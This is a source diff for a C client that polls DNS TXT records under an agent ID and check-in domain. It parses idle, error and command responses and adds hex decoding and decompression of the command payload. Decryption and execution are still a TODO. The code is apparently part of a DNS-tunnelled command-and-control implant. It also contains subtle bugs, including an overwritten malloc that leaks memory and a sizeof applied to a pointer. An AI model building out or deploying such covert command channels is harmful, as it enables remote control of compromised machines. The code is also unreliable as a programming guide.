@@ -5,6 +5,7 @@
 
 #include "utils.h"
 #include "options.h"
+#include "compression.h"
 
 /* DNS STUFF */
 #include <sys/types.h>
@@ -60,11 +61,13 @@ struct Client *init_client()
              client->agent_id_hex,
              client->domain);
 
+#ifdef DEBUG
     Dprintf("client init: state          = %d\n", client->status);
     Dprintf("client init: domain         = %s\n", client->domain);
     Dprintf("client init: agent_id       = %s\n", client->agent_id);
     Dprintf("client init: agent_id_hex   = %s\n", client->agent_id_hex);
     Dprintf("client init: checkin_domain = %s\n", client->checkin_domain);
+#endif
 
     return client;
 }
@@ -72,7 +75,8 @@ struct Client *init_client()
 void poll(client_t *client)
 {
 
-    unsigned char answer[300];
+    u_char answer[255]; // a single TXT string is max 255
+    char txt[255];
     int len;
     ns_msg msg;
     ns_rr rr;
@@ -85,45 +89,81 @@ void poll(client_t *client)
     if (ns_initparse(answer, len, &msg) < 0)
         return;
 
-    int rrmax = ns_msg_count(msg, ns_s_an);
-    Dprintf("[d] dns response had %d rrmax values, we only need 1\n", rrmax);
+    if (ns_msg_count(msg, ns_s_an) > 1)
+        Dprintf("[d] dns response had more than 1 answers. we are only taking the first\n");
 
-    if (ns_parserr(&msg, ns_s_an, 0, &rr))
+    if (ns_parserr(&msg, ns_s_an, 0, &rr)) // take the first rr, 0
         return;
 
-    const u_char *rd = ns_rr_rdata(rr);
+    if (ns_rr_type(rr) != ns_t_txt)
+        return;
 
-    Dprintf("[d] answer was: %s\n", rd);
+    // first byte seems to be a size byte maybe?
+    strlcpy(txt, (char *) ns_rr_rdata(rr) + 1, ns_rr_rdlen(rr));
+    // hex_dump("txt", &txt, sizeof(txt));
 
-    if (strstr((char *)rd, resp_idle) != NULL)
+    if (strstr(txt, resp_idle) != NULL)
     {
         client->status = Idle;
         return;
     }
 
-    if (strstr((char *)rd, resp_error) != NULL)
+    if (strstr(txt, resp_error) != NULL)
     {
         client->status = Error;
         return;
     }
 
-    if (strstr((char *)rd, resp_cmd) != NULL)
+    if (strstr(txt, resp_cmd) != NULL)
     {
         // double check and make sure we have ,p=
-        if (strstr((char *)rd, ",p=") == NULL)
+        if (strstr(txt, ",p=") == NULL)
         {
             // something is wrong, lets ignore that response
             client->status = Idle;
             return;
         }
 
-        char *data = strtok((char *)rd, "=");
-        while (data != NULL) {
-            printf("token :%s\n", data);
-            data = strtok(NULL, "=");
+        // when we're in a cmd state, we are expecting the bytes
+        // to process as the value for p.
+        //  ie. p=ffffff
+        char *command;
+
+        char *token = strtok(txt, "=");
+        while (token != NULL)
+        {
+            command = (char *)malloc(sizeof(token) + 1);
+            command = token;
+
+            // continue scanning
+            token = strtok(NULL, "=");
         }
 
-        // TODO: Gunzip, decrypt, json decode to get raw command
+        // str hex decode to byte array
+        char gz_bytes[strlen(command) / 2];
+        int w = hex_str_to_char(command, gz_bytes);
+        hex_dump("gz_bytes", &gz_bytes, sizeof(gz_bytes));
+
+#ifdef DEBUG
+        Dprintf(" - command hex %s\n", command);
+        Dprintf(" - command hex str len: %lu\n", strlen(command));
+        Dprintf(" - command decoding to gz_bytes wote %d bytes\n", w);
+        Dprintf(" - gz_bytes len: %lu\n", sizeof(gz_bytes));
+#endif
+
+        // decompress
+        char inflated[255];
+        u_int olen = 0;
+        int zres = zdepress(gz_bytes, sizeof(gz_bytes), &olen, inflated);
+        if (zres != 0)
+        {
+            Dprintf("decompression failed with status: %d\n", zres);
+            return;
+        }
+
+        hex_dump("inflated", &inflated, olen);
+
+        // TODO: decrypt, json decode to get raw command
         return;
     }
 }
